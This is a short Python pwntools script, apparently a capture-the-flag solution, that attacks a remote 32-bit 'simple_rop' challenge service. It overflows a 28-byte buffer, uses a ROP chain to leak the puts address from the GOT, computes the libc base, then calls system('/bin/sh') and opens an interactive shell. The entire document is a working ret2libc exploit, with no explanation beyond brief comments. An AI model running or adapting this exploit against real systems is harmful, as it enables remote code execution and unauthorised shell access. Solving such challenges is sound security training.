#!/usr/bin/python3

from pwn import *

p = remote('ctf-fsi.fe.up.pt', 7008)

elf = ELF("simple_rop")
rop = ROP(elf)

rop.call(elf.symbols["puts"], [elf.got["puts"]])  # Find puts address
rop.call(elf.symbols["main"])                     # Return to main after sending first payload

offset = 28
payload = b"A" * offset + rop.chain()

p.recvline()
p.sendline(payload)

puts_address = u32(p.recvline()[:4])

# Actually execute the exploit

libc = ELF("libc6_2.31-0ubuntu9_i386.so")
libc.address = puts_address - libc.symbols["puts"]

rop = ROP(libc)

rop.system(next(libc.search(b"/bin/sh\x00")))
rop.exit()

payload = b"A" * offset + rop.chain()

p.sendline(payload)
p.interactive()
